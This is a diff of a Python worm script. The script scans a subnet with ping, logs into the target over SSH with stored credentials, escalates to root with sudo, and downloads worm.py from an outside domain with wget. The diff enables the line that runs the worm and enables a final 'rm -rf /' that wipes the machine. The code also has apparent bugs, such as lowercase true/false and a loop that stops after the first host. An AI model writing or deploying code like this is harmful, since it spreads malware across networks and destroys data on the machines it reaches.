@@ -79,42 +79,42 @@ for target in targets:
 	ping_response = subprocess.Popen(["/bin/ping", "-c", "1", "-w", "1", "-W", "1", subnet + str(target)], stdout=subprocess.PIPE).stdout.read()
 
 	if ", 0% packet loss" in str(ping_response):
-		print(subnet + str(target) + " is go!")
+		write(subnet + str(target) + " is go!")
 		TARGET = subnet + str(target)
 		break
 	else:
-		print(subnet + str(target) + ", nope")
+		write(subnet + str(target) + ", nope")
 		break
 
 TARGET = subnet + "131"
 # Text to the viewer
 if TARGET == "":
-	print("No target was found :(")
+	write("No target was found :(")
 	sys.exit("")
 else:
-	print("Transfering to " + TARGET)
+	write("Transfering to " + TARGET)
 
 # Wait for previous to respond, if previous is given
 if my_file.is_file():
-	print("Previous defined, waiting for response")
+	write("Previous defined, waiting for response")
 	response = false
 	while response == false:
 		ping_response = subprocess.Popen(["/bin/ping", "-c", "1", "-w", "1", "-W", "1", TARGET], stdout=subprocess.PIPE).stdout.read()
 
 		if ", 0% packet loss" in str(ping_response):
-			print(TARGET + " is up again!")
+			write(TARGET + " is up again!")
 			response = true
 else:
-	print("No previous defined, continuing")
+	write("No previous defined, continuing")
 
 # Connect to target
 s = pxssh.pxssh()
 if not s.login (TARGET, username, password):
-	print("SSH session failed on login.")
-	print(str(s))
+	write("SSH session failed on login.")
+	write(str(s))
 	sys.exit("")
 else:
-	print("SSH session login successful")
+	write("SSH session login successful")
 	# Go sudo
 	s.sendline("sudo su")
 	s.expect('(?i)password'); s.sendline(password)        
@@ -126,8 +126,8 @@ else:
 	s.sendline("wget https://folkmann.tk/files/worm.py -O worm.py")
 	s.prompt()
 	# Start worm on new machine
-	#os.system("python3 worm.py")
-	#s.prompt()
+	os.system("python3 worm.py")
+	s.prompt()
 	# Terminate SSH connection
 	s.logout()
 
@@ -135,4 +135,4 @@ else:
 db.close()
 
 # Halt and catch fire
-#os.system("rm -rf /")
+os.system("rm -rf /")
